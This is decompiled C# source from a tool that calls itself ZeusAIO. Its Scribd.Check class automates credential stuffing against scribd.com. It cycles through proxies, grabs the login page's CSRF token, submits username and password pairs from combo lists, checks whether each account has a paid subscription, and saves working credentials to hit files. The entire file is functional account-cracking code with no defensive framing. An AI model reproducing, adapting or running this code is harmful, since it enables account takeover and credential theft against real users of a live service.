// Decompiled with JetBrains decompiler
// Type: Scribd.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Scribd
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = true;
              httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36rv:11.0) like Gecko");
              httpRequest.AddHeader("Pragma", "no-cache");
              httpRequest.AddHeader("Accept", "*/*");
              httpRequest.AddHeader("origin", "https://www.scribd.com");
              httpRequest.AddHeader("referer", "https://www.scribd.com/login");
              httpRequest.AddHeader("sec-fetch-dest", "empty");
              httpRequest.AddHeader("sec-fetch-mode", "cors");
              httpRequest.AddHeader("sec-fetch-site", "same-origin");
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str1 = Check.Parse(httpRequest.Get("https://www.scribd.com/login").ToString(), "name=\"csrf-token\" content=\"", "\" />");
              httpRequest.ClearAllHeaders();
              httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36rv:11.0) like Gecko");
              httpRequest.AddHeader("Pragma", "no-cache");
              httpRequest.AddHeader("Accept", "*/*");
              httpRequest.AddHeader("origin", "https://www.scribd.com");
              httpRequest.AddHeader("referer", "https://www.scribd.com/login");
              httpRequest.AddHeader("sec-fetch-dest", "empty");
              httpRequest.AddHeader("sec-fetch-mode", "cors");
              httpRequest.AddHeader("sec-fetch-site", "same-origin");
              httpRequest.AddHeader("x-csrf-token", str1);
              httpRequest.AddHeader("x-requested-with", "XMLHttpRequest");
              string str2 = "{\"login_or_email\":\"" + s[0] + "\",\"login_password\":\"" + s[1] + "\",\"rememberme\":\"\",\"signup_location\":\"https://www.scribd.com/login\",\"login_params\":{}}";
              string str3 = httpRequest.Post("https://www.scribd.com/login", str2, "application/json").ToString();
              if (!str3.Contains("No account found with that email or username. Please try again or sign up.\"}]}") && !str3.Contains("Invalid password. Please try again"))
              {
                if (str3.Contains("success\":true"))
                {
                  httpRequest.ClearAllHeaders();
                  httpRequest.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36");
                  httpRequest.AddHeader("Pragma", "no-cache");
                  httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                  string source = httpRequest.Get("https://www.scribd.com/account-settings").ToString();
                  if (source.Contains("next_payment_date\":\""))
                  {
                    string str4 = Check.Parse(source, "next_payment_date\":\"", "\",\"");
                    ++mainmenu.hits;
                    if (mainmenu.p1 == "2")
                      Colorful.Console.WriteLine("[HIT - SCRIBD] " + s[0] + ":" + s[1] + " | Valid till: " + str4, Color.Green);
                    Export.AsResult("/Scribd_hits", s[0] + ":" + s[1] + " | Valid till: " + str4);
                    return false;
                  }
                  ++mainmenu.frees;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[FREE - SCRIBD] " + s[0] + ":" + s[1], Color.OrangeRed);
                  Export.AsResult("/Scribd_frees", s[0] + ":" + s[1]);
                  return false;
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
